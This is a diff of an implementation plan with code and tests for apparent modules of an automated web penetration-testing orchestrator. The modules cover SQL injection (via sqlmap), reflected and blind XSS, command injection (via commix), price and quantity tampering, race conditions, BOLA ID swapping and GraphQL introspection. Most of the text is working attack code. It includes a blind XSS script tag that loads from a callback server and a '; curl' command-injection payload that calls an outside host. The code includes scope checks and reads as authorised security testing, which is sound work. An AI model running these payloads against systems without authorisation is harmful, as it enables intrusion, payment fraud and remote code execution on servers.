+    async def _run_sqlmap(self, url: str, param: str, method: str):
+        if not self._cmd.is_tool_available("sqlmap"):
+            self.logger.warning("sqlmap not found, skipping automated exploitation")
+            return
+
+        args = ["-u", f"{url}?{param}=test" if method == "GET" else url,
+                "-p", param, "--batch", "--level=2", "--risk=1",
+                "--output-dir=/tmp/sqlmap_output", "--smart"]
+
+        if method == "POST":
+            args.extend(["--method=POST", f"--data={param}=test"])
+
+        result = self._cmd.run("sqlmap", args, timeout=300)
+        if result.returncode == 0:
+            self.evidence.log_tool_output("input_validation", "sqlmap", result.stdout)
+
+    async def _xss_testing(self):
+        self.logger.info("Starting XSS testing")
+        parameters = self.state.get("parameters") or []
+
+        for param in parameters:
+            url = param.get("url", "")
+            name = param.get("name", "")
+            method = param.get("method", "GET")
+
+            for payload in self.XSS_PAYLOADS:
+                try:
+                    resp = self._inject_param(url, name, payload, method)
+                    if payload in resp.text:
+                        self.evidence.log_potential_exploit("input_validation", {
+                            "type": "xss_reflected",
+                            "url": url, "parameter": name,
+                            "payload": payload,
+                            "severity": "high",
+                            "context": self._detect_xss_context(resp.text, payload),
+                        })
+                        self.state.enrich("potential_vulnerabilities", [{
+                            "type": "xss_reflected",
+                            "url": url,
+                            "severity": "high",
+                            "description": f"Reflected XSS in param '{name}' with payload: {payload}",
+                        }])
+                        break  # Found one, move to next param
+                except Exception:
+                    continue
+
+            # Blind XSS via callback server
+            callback_url, token = self.callback.generate_callback(
+                module="input_validation",
+                parameter=name,
+                payload="blind_xss",
+            )
+            blind_payload = f'"><script src="{callback_url}"></script>'
+            try:
+                self._inject_param(url, name, blind_payload, method)
+            except Exception:
+                pass
+
+    def _detect_xss_context(self, body: str, payload: str) -> str:
+        idx = body.find(payload)
+        if idx == -1:
+            return "unknown"
+        context = body[max(0, idx - 50):idx + len(payload) + 50]
+        if re.search(r'<script[^>]*>', context[:50], re.I):
+            return "script_block"
+        if re.search(r'<[^>]+$', context[:50]):
+            return "html_attribute"
+        return "html_body"
+
+    async def _command_injection(self):
+        self.logger.info("Starting command injection testing")
+        parameters = self.state.get("parameters") or []
+
+        for param in parameters:
+            url = param.get("url", "")
+            name = param.get("name", "")
+            method = param.get("method", "GET")
+
+            # Direct output detection
+            for payload in self.CMDI_PAYLOADS:
+                try:
+                    resp = self._inject_param(url, name, payload, method)
+                    for sig in self.CMDI_SIGNATURES:
+                        if re.search(sig, resp.text):
+                            self.evidence.log_confirmed_exploit("input_validation", {
+                                "type": "command_injection",
+                                "url": url, "parameter": name,
+                                "payload": payload,
+                                "severity": "critical",
+                                "output_snippet": resp.text[:500],
+                            })
+                            self.state.enrich("confirmed_vulnerabilities", [{
+                                "type": "command_injection",
+                                "url": url,
+                                "severity": "critical",
+                                "description": f"Command injection in param '{name}'",
+                                "reproduction_steps": f"1. Send {method} to {url}\n2. Set {name}={payload}",
+                                "impact": "Remote code execution on the server",
+                                "mitigation": "Never pass user input to shell commands. Use parameterized APIs.",
+                            }])
+                            break
+                except Exception:
+                    continue
+
+            # Time-based detection
+            for payload in self.CMDI_TIME_PAYLOADS:
+                try:
+                    start = time.monotonic()
+                    self._inject_param(url, name, payload, method)
+                    elapsed = time.monotonic() - start
+                    if elapsed >= 2.5:
+                        self.evidence.log_potential_exploit("input_validation", {
+                            "type": "command_injection_blind",
+                            "url": url, "parameter": name,
+                            "payload": payload, "delay": elapsed,
+                            "severity": "critical",
+                        })
+                        self.state.enrich("potential_vulnerabilities", [{
+                            "type": "command_injection_blind",
+                            "url": url,
+                            "severity": "critical",
+                            "description": f"Blind command injection in '{name}' (delay: {elapsed:.1f}s)",
+                        }])
+                        break
+                except Exception:
+                    continue
+
+            # DNS-based blind detection via callback
+            callback_url, token = self.callback.generate_callback(
+                module="input_validation", parameter=name, payload="cmdi_blind",
+            )
+            dns_payload = f"; curl {callback_url}"
+            try:
+                self._inject_param(url, name, dns_payload, method)
+            except Exception:
+                pass
+
+        # Commix handoff
+        if self._cmd.is_tool_available("commix"):
+            for param in parameters[:5]:
+                url = param.get("url", "")
+                name = param.get("name", "")
+                result = self._cmd.run(
+                    "commix",
+                    ["--url", f"{url}?{name}=test", "--batch", "--level=2"],
+                    timeout=120,
+                )
+                if result.returncode == 0:
+                    self.evidence.log_tool_output("input_validation", "commix", result.stdout)
+
+    def _inject_param(self, url: str, param_name: str, payload: str, method: str = "GET"):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        if method.upper() == "GET":
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            params[param_name] = payload
+            new_query = urlencode(params, doseq=True)
+            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
+                                   parsed.params, new_query, parsed.fragment))
+            return client.get(test_url)
+        else:
+            return client.post(url, data={param_name: payload})
+```
+
+**Step 4: Run tests**
+
+```bash
+pytest tests/test_input_validation.py -v
+```
+
+Expected: All PASS
+
+**Step 5: Commit**
+
+```bash
+git add wstg_orchestrator/modules/input_validation.py tests/test_input_validation.py
+git commit -m "feat: implement InputValidationModule with SQLi, XSS, and command injection testing"
+```
+
+---
+
+## Task 20: Business Logic Module
+
+**Files:**
+- Create: `wstg_orchestrator/modules/business_logic.py`
+- Create: `tests/test_business_logic.py`
+
+**Step 1: Write failing tests**
+
+```python
+# tests/test_business_logic.py
+import pytest
+from unittest.mock import MagicMock
+from wstg_orchestrator.modules.business_logic import BusinessLogicModule
+
+
+@pytest.fixture
+def bl_module():
+    state = MagicMock()
+    state.get.side_effect = lambda key: {
+        "live_hosts": ["https://app.example.com"],
+        "endpoints": [
+            "https://app.example.com/checkout",
+            "https://app.example.com/api/order",
+        ],
+        "parameters": [
+            {"url": "https://app.example.com/api/order", "name": "price", "value": "99.99", "method": "POST"},
+            {"url": "https://app.example.com/api/order", "name": "quantity", "value": "1", "method": "POST"},
+        ],
+        "forms": [],
+    }.get(key, [])
+    state.is_phase_complete.return_value = False
+    state.is_subcategory_complete.return_value = False
+    config = MagicMock()
+    config.base_domain = "example.com"
+    config.get_tool_config.return_value = {}
+    config.custom_headers = {}
+    scope = MagicMock()
+    scope.is_in_scope.return_value = True
+    scope.is_attack_vector_allowed.return_value = True
+    limiter = MagicMock()
+    evidence = MagicMock()
+    evidence.log_parsed.return_value = "/tmp/test"
+    evidence.log_potential_exploit.return_value = "/tmp/test"
+    callback = MagicMock()
+    return BusinessLogicModule(state, config, scope, limiter, evidence, callback)
+
+
+def test_phase_name(bl_module):
+    assert bl_module.PHASE_NAME == "business_logic"
+
+
+def test_subcategories(bl_module):
+    assert "workflow_bypass" in bl_module.SUBCATEGORIES
+    assert "parameter_tampering" in bl_module.SUBCATEGORIES
+    assert "race_conditions" in bl_module.SUBCATEGORIES
+
+
+def test_tamper_values(bl_module):
+    values = bl_module.PRICE_TAMPER_VALUES
+    assert 0 in values
+    assert -1 in values
+    assert 0.01 in values
+
+
+def test_race_skipped_when_dos_blocked():
+    state = MagicMock()
+    state.get.return_value = []
+    state.is_phase_complete.return_value = False
+    state.is_subcategory_complete.return_value = False
+    config = MagicMock()
+    config.base_domain = "example.com"
+    config.get_tool_config.return_value = {}
+    scope = MagicMock()
+    scope.is_attack_vector_allowed.side_effect = lambda v: v != "dos"
+    limiter = MagicMock()
+    evidence = MagicMock()
+    callback = MagicMock()
+    mod = BusinessLogicModule(state, config, scope, limiter, evidence, callback)
+    assert mod.is_attack_allowed("dos") is False
+```
+
+**Step 2: Run tests to verify they fail**
+
+```bash
+pytest tests/test_business_logic.py -v
+```
+
+**Step 3: Implement BusinessLogicModule**
+
+```python
+# wstg_orchestrator/modules/business_logic.py
+import concurrent.futures
+import time
+
+from wstg_orchestrator.modules.base_module import BaseModule
+from wstg_orchestrator.utils.parser_utils import diff_responses
+
+
+class BusinessLogicModule(BaseModule):
+    PHASE_NAME = "business_logic"
+    SUBCATEGORIES = ["workflow_bypass", "parameter_tampering", "race_conditions"]
+    EVIDENCE_SUBDIRS = [
+        "tool_output", "raw_requests", "raw_responses", "parsed",
+        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
+    ]
+
+    PRICE_TAMPER_VALUES = [0, -1, 0.01, 0.001, 99999999, -99.99]
+    QUANTITY_TAMPER_VALUES = [0, -1, 99999999, 0.5]
+
+    async def execute(self):
+        if not self.should_skip_subcategory("workflow_bypass"):
+            await self._workflow_bypass()
+            self.mark_subcategory_complete("workflow_bypass")
+
+        if not self.should_skip_subcategory("parameter_tampering"):
+            await self._parameter_tampering()
+            self.mark_subcategory_complete("parameter_tampering")
+
+        if not self.should_skip_subcategory("race_conditions"):
+            if self.is_attack_allowed("dos"):
+                await self._race_conditions()
+            else:
+                self.logger.info("DoS-style testing blocked by scope, skipping race conditions")
+            self.mark_subcategory_complete("race_conditions")
+
+    async def _workflow_bypass(self):
+        self.logger.info("Starting workflow bypass testing")
+        endpoints = self.state.get("endpoints") or []
+
+        # Identify multi-step workflows
+        checkout_patterns = [
+            "/checkout", "/payment", "/confirm", "/review",
+            "/step2", "/step3", "/finalize", "/complete",
+        ]
+
+        workflow_endpoints = [
+            ep for ep in endpoints
+            if any(p in ep.lower() for p in checkout_patterns)
+        ]
+
+        # Try accessing later steps directly without completing earlier ones
+        for endpoint in workflow_endpoints:
+            try:
+                resp = self._http_get(endpoint)
+                if resp.status_code == 200:
+                    body_lower = resp.text.lower()
+                    # Check if we got the actual page instead of a redirect
+                    if not any(err in body_lower for err in ["redirect", "login", "unauthorized", "forbidden"]):
+                        self.evidence.log_potential_exploit("business_logic", {
+                            "type": "workflow_bypass",
+                            "url": endpoint,
+                            "severity": "medium",
+                            "description": f"Direct access to workflow step without completing prerequisites",
+                        })
+                        self.state.enrich("potential_vulnerabilities", [{
+                            "type": "workflow_bypass",
+                            "url": endpoint,
+                            "severity": "medium",
+                            "description": "Workflow step accessible without completing prior steps",
+                        }])
+            except Exception:
+                continue
+
+    async def _parameter_tampering(self):
+        self.logger.info("Starting parameter tampering")
+        parameters = self.state.get("parameters") or []
+
+        # Price tampering
+        price_params = [p for p in parameters if p.get("name", "").lower() in
+                        ["price", "amount", "total", "cost", "fee", "charge", "subtotal"]]
+
+        for param in price_params:
+            url = param["url"]
+            name = param["name"]
+            for tamper_value in self.PRICE_TAMPER_VALUES:
+                try:
+                    resp = self._http_post(url, data={name: str(tamper_value)})
+                    if resp.status_code == 200:
+                        self.evidence.log_potential_exploit("business_logic", {
+                            "type": "price_tampering",
+                            "url": url, "parameter": name,
+                            "original_value": param.get("value"),
+                            "tampered_value": tamper_value,
+                            "severity": "high",
+                            "description": f"Price parameter accepted tampered value: {tamper_value}",
+                        })
+                        self.state.enrich("potential_vulnerabilities", [{
+                            "type": "price_tampering",
+                            "url": url,
+                            "severity": "high",
+                            "description": f"Price param '{name}' accepted value: {tamper_value}",
+                        }])
+                except Exception:
+                    continue
+
+        # Quantity tampering
+        qty_params = [p for p in parameters if p.get("name", "").lower() in
+                      ["quantity", "qty", "count", "num", "amount"]]
+
+        for param in qty_params:
+            url = param["url"]
+            name = param["name"]
+            for tamper_value in self.QUANTITY_TAMPER_VALUES:
+                try:
+                    resp = self._http_post(url, data={name: str(tamper_value)})
+                    if resp.status_code == 200:
+                        self.evidence.log_potential_exploit("business_logic", {
+                            "type": "quantity_tampering",
+                            "url": url, "parameter": name,
+                            "tampered_value": tamper_value,
+                            "severity": "medium",
+                        })
+                except Exception:
+                    continue
+
+    async def _race_conditions(self):
+        self.logger.info("Starting race condition testing")
+        endpoints = self.state.get("endpoints") or []
+
+        # Target endpoints that modify state
+        state_changing = [
+            ep for ep in endpoints
+            if any(p in ep.lower() for p in [
+                "/apply", "/redeem", "/coupon", "/transfer",
+                "/withdraw", "/buy", "/order", "/vote",
+            ])
+        ]
+
+        for endpoint in state_changing[:3]:  # Limit to 3
+            try:
+                responses = self._send_concurrent(endpoint, count=10)
+                success_count = sum(1 for r in responses if r and r.status_code == 200)
+                unique_bodies = len(set(r.text[:200] for r in responses if r))
+
+                if success_count > 1 and unique_bodies > 1:
+                    self.evidence.log_potential_exploit("business_logic", {
+                        "type": "race_condition",
+                        "url": endpoint,
+                        "concurrent_successes": success_count,
+                        "unique_responses": unique_bodies,
+                        "severity": "high",
+                        "description": "Inconsistent state under concurrent requests",
+                    })
+                    self.state.enrich("potential_vulnerabilities", [{
+                        "type": "race_condition",
+                        "url": endpoint,
+                        "severity": "high",
+                        "description": f"Race condition: {success_count}/10 concurrent requests succeeded with {unique_bodies} unique responses",
+                    }])
+            except Exception as e:
+                self.logger.debug(f"Race condition test failed for {endpoint}: {e}")
+
+    def _send_concurrent(self, url: str, count: int = 10):
+        import requests as req_lib
+        headers = self.config.custom_headers if hasattr(self.config, 'custom_headers') else {}
+
+        def send_one(_):
+            try:
+                return req_lib.post(url, headers=headers, timeout=10)
+            except Exception:
+                return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=count) as executor:
+            futures = [executor.submit(send_one, i) for i in range(count)]
+            return [f.result() for f in concurrent.futures.as_completed(futures)]
+
+    def _http_get(self, url: str):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.get(url)
+
+    def _http_post(self, url: str, data: dict | None = None):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.post(url, data=data)
+```
+
+**Step 4: Run tests**
+
+```bash
+pytest tests/test_business_logic.py -v
+```
+
+Expected: All PASS
+
+**Step 5: Commit**
+
+```bash
+git add wstg_orchestrator/modules/business_logic.py tests/test_business_logic.py
+git commit -m "feat: implement BusinessLogicModule with workflow bypass, price tamper, and race conditions"
+```
+
+---
+
+## Task 21: API Testing Module
+
+**Files:**
+- Create: `wstg_orchestrator/modules/api_testing.py`
+- Create: `tests/test_api_testing.py`
+
+**Step 1: Write failing tests**
+
+```python
+# tests/test_api_testing.py
+import pytest
+from unittest.mock import MagicMock
+from wstg_orchestrator.modules.api_testing import ApiTestingModule
+
+
+@pytest.fixture
+def api_module():
+    state = MagicMock()
+    state.get.side_effect = lambda key: {
+        "live_hosts": ["https://app.example.com"],
+        "endpoints": [
+            "https://app.example.com/api/v1/users",
+            "https://app.example.com/graphql",
+        ],
+        "api_endpoints": [],
+        "parameters": [],
+    }.get(key, [])
+    state.is_phase_complete.return_value = False
+    state.is_subcategory_complete.return_value = False
+    config = MagicMock()
+    config.base_domain = "example.com"
+    config.get_tool_config.return_value = {}
+    config.custom_headers = {}
+    scope = MagicMock()
+    scope.is_in_scope.return_value = True
+    limiter = MagicMock()
+    evidence = MagicMock()
+    evidence.log_parsed.return_value = "/tmp/test"
+    evidence.log_tool_output.return_value = "/tmp/test"
+    evidence.log_potential_exploit.return_value = "/tmp/test"
+    evidence.log_confirmed_exploit.return_value = "/tmp/test"
+    callback = MagicMock()
+    return ApiTestingModule(state, config, scope, limiter, evidence, callback)
+
+
+def test_phase_name(api_module):
+    assert api_module.PHASE_NAME == "api_testing"
+
+
+def test_subcategories(api_module):
+    assert "api_discovery" in api_module.SUBCATEGORIES
+    assert "bola_testing" in api_module.SUBCATEGORIES
+    assert "graphql_testing" in api_module.SUBCATEGORIES
+
+
+def test_swagger_paths(api_module):
+    assert len(api_module.SWAGGER_PATHS) > 0
+    assert "/swagger.json" in api_module.SWAGGER_PATHS or "/openapi.json" in api_module.SWAGGER_PATHS
+
+
+def test_graphql_introspection_query(api_module):
+    query = api_module.INTROSPECTION_QUERY
+    assert "__schema" in query
+    assert "queryType" in query
+```
+
+**Step 2: Run tests to verify they fail**
+
+```bash
+pytest tests/test_api_testing.py -v
+```
+
+**Step 3: Implement ApiTestingModule**
+
+```python
+# wstg_orchestrator/modules/api_testing.py
+import json
+import re
+
+from wstg_orchestrator.modules.base_module import BaseModule
+from wstg_orchestrator.utils.command_runner import CommandRunner
+from wstg_orchestrator.utils.parser_utils import diff_responses
+
+
+class ApiTestingModule(BaseModule):
+    PHASE_NAME = "api_testing"
+    SUBCATEGORIES = ["api_discovery", "bola_testing", "graphql_testing"]
+    EVIDENCE_SUBDIRS = [
+        "tool_output", "raw_requests", "raw_responses", "parsed",
+        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
+    ]
+
+    SWAGGER_PATHS = [
+        "/swagger.json", "/openapi.json", "/api-docs",
+        "/swagger/v1/swagger.json", "/v1/swagger.json",
+        "/v2/swagger.json", "/api/swagger.json",
+        "/swagger-ui.html", "/swagger-resources",
+        "/openapi/v3/api-docs", "/api/v1/openapi.json",
+        "/docs", "/redoc", "/.well-known/openapi.json",
+    ]
+
+    API_VERSION_PATHS = [
+        "/api/v{n}/", "/v{n}/api/", "/api/{n}/",
+    ]
+
+    INTROSPECTION_QUERY = """
+    query IntrospectionQuery {
+        __schema {
+            queryType { name }
+            mutationType { name }
+            types {
+                name
+                kind
+                fields {
+                    name
+                    type { name kind }
+                    args { name type { name } }
+                }
+            }
+        }
+    }
+    """
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self._cmd = CommandRunner(
+            tool_configs={
+                name: self.config.get_tool_config(name)
+                for name in ["kiterunner"]
+            }
+        )
+
+    async def execute(self):
+        if not self.should_skip_subcategory("api_discovery"):
+            await self._api_discovery()
+            self.mark_subcategory_complete("api_discovery")
+
+        if not self.should_skip_subcategory("bola_testing"):
+            await self._bola_testing()
+            self.mark_subcategory_complete("bola_testing")
+
+        if not self.should_skip_subcategory("graphql_testing"):
+            await self._graphql_testing()
+            self.mark_subcategory_complete("graphql_testing")
+
+    async def _api_discovery(self):
+        self.logger.info("Starting API discovery")
+        live_hosts = self.state.get("live_hosts") or []
+        found_apis = []
+
+        for host_url in live_hosts:
+            base = host_url.rstrip("/")
+
+            # Swagger/OpenAPI detection
+            for path in self.SWAGGER_PATHS:
+                try:
+                    resp = self._http_get(f"{base}{path}")
+                    if resp.status_code == 200:
+                        content_type = resp.headers.get("Content-Type", "")
+                        if "json" in content_type or resp.text.strip().startswith("{"):
+                            try:
+                                spec = json.loads(resp.text)
+                                if "swagger" in spec or "openapi" in spec or "paths" in spec:
+                                    self.logger.info(f"Found OpenAPI spec at {base}{path}")
+                                    self.evidence.log_tool_output("api_testing", "swagger_spec", resp.text)
+                                    # Extract endpoints from spec
+                                    paths = spec.get("paths", {})
+                                    for api_path, methods in paths.items():
+                                        full_url = f"{base}{api_path}"
+                                        found_apis.append(full_url)
+                                        for method_name in methods:
+                                            if method_name.upper() in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
+                                                self.evidence.log_parsed("api_testing", "api_endpoint", {
+                                                    "url": full_url, "method": method_name.upper(),
+                                                })
+                            except json.JSONDecodeError:
+                                pass
+                except Exception:
+                    continue
+
+            # API version rollback
+            for version_template in self.API_VERSION_PATHS:
+                for n in range(1, 5):
+                    version_path = version_template.replace("{n}", str(n))
+                    try:
+                        resp = self._http_get(f"{base}{version_path}")
+                        if resp.status_code in [200, 301, 302]:
+                            found_apis.append(f"{base}{version_path}")
+                    except Exception:
+                        continue
+
+        # Kiterunner
+        if self._cmd.is_tool_available("kiterunner"):
+            for host_url in live_hosts[:3]:
+                result = self._cmd.run(
+                    "kiterunner", ["scan", host_url, "--fail-status-codes", "404,400"],
+                    timeout=300,
+                )
+                if result.returncode == 0:
+                    self.evidence.log_tool_output("api_testing", "kiterunner", result.stdout)
+                    for line in result.stdout.splitlines():
+                        url_match = re.search(r'(https?://\S+)', line)
+                        if url_match:
+                            found_apis.append(url_match.group(1))
+
+        if found_apis:
+            self.state.enrich("api_endpoints", list(set(found_apis)))
+            self.state.enrich("endpoints", list(set(found_apis)))
+            self.evidence.log_parsed("api_testing", "discovered_apis", list(set(found_apis)))
+
+    async def _bola_testing(self):
+        self.logger.info("Starting BOLA testing")
+        api_endpoints = self.state.get("api_endpoints") or []
+        idor_candidates = self.state.get("potential_idor_candidates") or []
+
+        # Find API endpoints with IDs
+        id_pattern = re.compile(r'/(\d+)(?:/|$|\?)')
+        for endpoint in api_endpoints:
+            match = id_pattern.search(endpoint)
+            if match:
+                original_id = match.group(1)
+                for test_id in [str(int(original_id) + 1), str(int(original_id) - 1), "1"]:
+                    test_url = endpoint.replace(f"/{original_id}", f"/{test_id}")
+                    try:
+                        original_resp = self._http_get(endpoint)
+                        test_resp = self._http_get(test_url)
+
+                        if test_resp.status_code == 200 and original_resp.status_code == 200:
+                            diff = diff_responses(original_resp.text, test_resp.text)
+                            if not diff["identical"]:
+                                self.evidence.log_potential_exploit("api_testing", {
+                                    "type": "bola",
+                                    "original_url": endpoint,
+                                    "test_url": test_url,
+                                    "severity": "high",
+                                    "description": "Potential BOLA: API returned different data for different IDs",
+                                })
+                                self.state.enrich("potential_vulnerabilities", [{
+                                    "type": "bola",
+                                    "url": test_url,
+                                    "severity": "high",
+                                    "description": f"BOLA: ID swap from {original_id} to {test_id} returned data",
+                                }])
+                    except Exception:
+                        continue
+
+    async def _graphql_testing(self):
+        self.logger.info("Starting GraphQL testing")
+        live_hosts = self.state.get("live_hosts") or []
+        endpoints = self.state.get("endpoints") or []
+
+        graphql_endpoints = [
+            ep for ep in endpoints + live_hosts
+            if "graphql" in ep.lower()
+        ]
+
+        # Also probe common GraphQL paths
+        for host_url in live_hosts:
+            base = host_url.rstrip("/")
+            for path in ["/graphql", "/graphiql", "/gql", "/api/graphql"]:
+                try:
+                    resp = self._http_post(f"{base}{path}", json_data={"query": "{ __typename }"})
+                    if resp.status_code == 200 and "__typename" in resp.text:
+                        graphql_endpoints.append(f"{base}{path}")
+                except Exception:
+                    continue
+
+        graphql_endpoints = list(set(graphql_endpoints))
+
+        for endpoint in graphql_endpoints:
+            # Introspection query
+            try:
+                resp = self._http_post(endpoint, json_data={"query": self.INTROSPECTION_QUERY})
+                if resp.status_code == 200 and "__schema" in resp.text:
+                    self.logger.info(f"GraphQL introspection enabled at {endpoint}")
+                    self.evidence.log_tool_output("api_testing", "graphql_schema", resp.text)
+
+                    try:
+                        schema = json.loads(resp.text)
+                        types = schema.get("data", {}).get("__schema", {}).get("types", [])
+                        self.evidence.log_parsed("api_testing", "graphql_types", {
+                            "endpoint": endpoint,
+                            "type_count": len(types),
+                            "types": [t.get("name") for t in types if not t.get("name", "").startswith("__")],
+                        })
+                    except json.JSONDecodeError:
+                        pass
+
+                    self.state.enrich("potential_vulnerabilities", [{
+                        "type": "graphql_introspection",
+                        "url": endpoint,
+                        "severity": "low",
+                        "description": "GraphQL introspection enabled — full schema is queryable",
+                    }])
+
+                    # Depth abuse test
+                    depth_query = self._build_depth_query(5)
+                    try:
+                        depth_resp = self._http_post(endpoint, json_data={"query": depth_query})
+                        if depth_resp.status_code == 200 and "errors" not in depth_resp.text.lower():
+                            self.evidence.log_potential_exploit("api_testing", {
+                                "type": "graphql_depth_abuse",
+                                "url": endpoint,
+                                "depth": 5,
+                                "severity": "medium",
+                                "description": "GraphQL allows deeply nested queries (no depth limit)",
+                            })
+                    except Exception:
+                        pass
+            except Exception as e:
+                self.logger.debug(f"GraphQL test failed for {endpoint}: {e}")
+
+    def _build_depth_query(self, depth: int) -> str:
+        query = "{ __typename }"
+        for i in range(depth):
+            query = f"{{ __schema {{ types {{ fields {{ type {{ ofType {query} }} }} }} }} }}"
+        return query
+
+    def _http_get(self, url: str, extra_headers: dict | None = None):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.get(url, headers=extra_headers)
+
+    def _http_post(self, url: str, data: dict | None = None, json_data: dict | None = None):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.post(url, data=data, json_data=json_data)
+```
+
+**Step 4: Run tests**
+
+```bash
+pytest tests/test_api_testing.py -v
+```
+
+Expected: All PASS
+
+**Step 5: Commit**
+
+```bash
+git add wstg_orchestrator/modules/api_testing.py tests/test_api_testing.py
+git commit -m "feat: implement ApiTestingModule with Swagger detection, BOLA, and GraphQL introspection"
+```
 
 ---
 
